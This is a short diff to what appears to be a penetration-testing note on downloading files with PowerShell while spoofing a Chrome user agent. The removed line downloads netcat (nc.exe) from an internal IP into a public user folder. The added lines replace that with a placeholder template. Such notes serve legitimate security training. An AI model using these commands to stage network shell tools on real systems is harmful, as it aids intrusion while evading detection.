@@ -11,6 +11,10 @@ type: note
 ```
 
 #### Example Request with Chrome User Agent
-```bash
-$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome  Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```powershell
+$UserAgent =[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+```
+
+```powershell
+ Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "<PATH TO SAVE FILE TO>/<FILE>"
 ```
